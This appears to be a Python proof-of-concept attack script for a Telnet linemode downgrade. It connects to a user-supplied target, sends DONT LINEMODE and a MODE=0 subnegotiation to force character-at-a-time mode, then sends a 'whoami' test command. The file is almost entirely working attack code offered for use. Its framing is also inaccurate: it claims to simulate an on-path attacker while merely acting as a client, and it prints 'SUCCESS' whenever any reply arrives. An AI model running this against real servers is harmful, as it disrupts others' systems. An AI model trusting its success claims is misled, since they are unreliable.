#!/usr/bin/env python3
"""
Proof-of-Concept: Telnet Linemode Downgrade to Character-at-a-Time

This script demonstrates how an on-path attacker can manipulate Telnet
negotiation to force a connection into character-at-a-time mode by
injecting 'DONT LINEMODE' commands, degrading performance and potentially
causing input corruption for applications expecting local line editing.

References:
- RFC 1184: Telnet Linemode Option
- Technique: Telnet Linemode Downgrade to Character-at-a-Time
"""

import socket
import sys
import struct
import time

# Telnet Command Constants
IAC = 0xFF  # Interpret As Command
WILL = 0xFB
WONT = 0xFC
DO = 0xFD
DONT = 0xFE
SB = 0xFA   # Subnegotiation Begin
SE = 0xF0   # Subnegotiation End

# Telnet Option Constants
LINEMODE = 34  # RFC 1184

# Linemode Subnegotiation Constants
MODE = 1
EDIT = 1  # Bit 0 of MODE byte

def send_telnet_command(sock, cmd, option):
    """Send a Telnet negotiation command."""
    sock.sendall(bytes([IAC, cmd, option]))
    print(f"[+] Sent: IAC {cmd_name(cmd)} {option_name(option)}")

def send_linemode_subnegotiation(sock, mode_byte):
    """Send a LINEMODE subnegotiation to set the MODE."""
    # IAC SB LINEMODE MODE <mode_byte> IAC SE
    msg = bytes([IAC, SB, LINEMODE, MODE, mode_byte, IAC, SE])
    sock.sendall(msg)
    print(f"[+] Sent: IAC SB LINEMODE MODE {mode_byte} IAC SE")

def cmd_name(cmd):
    names = {WILL: 'WILL', WONT: 'WONT', DO: 'DO', DONT: 'DONT', SB: 'SB', SE: 'SE'}
    return names.get(cmd, f'UNKNOWN({cmd})')

def option_name(opt):
    names = {LINEMODE: 'LINEMODE'}
    return names.get(opt, f'UNKNOWN({opt})')

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"[*] Connecting to Telnet server at {target_ip}:{target_port}")
    
    try:
        # Step 1: Establish a raw TCP connection to the Telnet server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        print("[+] Connection established.")

        # Step 2: Wait for initial server banner and negotiation
        # Telnet servers often send initial negotiation commands
        time.sleep(1)
        
        # Read any initial data (banner/negotiation)
        try:
            initial_data = sock.recv(1024)
            if initial_data:
                print(f"[+] Received initial data ({len(initial_data)} bytes): {initial_data[:50]}")
        except socket.timeout:
            pass

        # Step 3: Simulate normal client behavior by accepting LINEMODE
        # In a real attack, this might be injected during an existing negotiation
        print("\n[*] Phase 1: Normal negotiation (client accepts LINEMODE)")
        send_telnet_command(sock, WILL, LINEMODE)
        
        # Wait for server response
        time.sleep(1)
        try:
            response = sock.recv(1024)
            if response:
                print(f"[+] Server response: {response}")
        except socket.timeout:
            print("[+] No immediate server response (expected in some implementations)")

        # Step 4: Attack - Force downgrade by sending DONT LINEMODE
        # This simulates an on-path attacker injecting/modifying negotiation
        print("\n[*] Phase 2: Attack - Injecting DONT LINEMODE to force downgrade")
        send_telnet_command(sock, DONT, LINEMODE)
        
        # Also send a subnegotiation to clear the EDIT bit as a secondary attack vector
        print("[*] Sending subnegotiation to clear EDIT bit (MODE=0)")
        send_linemode_subnegotiation(sock, 0)  # MODE=0 means no EDIT bit set

        # Step 5: Observe the outcome
        print("\n[*] Phase 3: Observing connection behavior")
        print("[!] The server should now be in character-at-a-time mode.")
        print("[!] This degrades performance over high-latency links and may cause")
        print("[!] input corruption for applications expecting local line editing.")
        
        # Send a test command to demonstrate the behavior
        time.sleep(1)
        test_input = b"whoami\r\n"
        print(f"\n[*] Sending test command: {test_input}")
        sock.sendall(test_input)
        
        # Wait for response
        time.sleep(2)
        try:
            response = sock.recv(4096)
            if response:
                print(f"[+] Server response: {response.decode('utf-8', errors='ignore')}")
                print("\n[+] SUCCESS: Connection is operating in character-at-a-time mode.")
                print("    Each character was processed individually by the server.")
            else:
                print("[+] No response received (connection may have been closed)")
        except socket.timeout:
            print("[+] No response received (timeout)")

        # Cleanup
        sock.close()
        print("\n[*] Connection closed.")
        
    except ConnectionRefusedError:
        print(f"[!] Connection refused. Is the Telnet server running on {target_ip}:{target_port}?")
    except socket.timeout:
        print("[!] Connection timed out. Check network connectivity.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()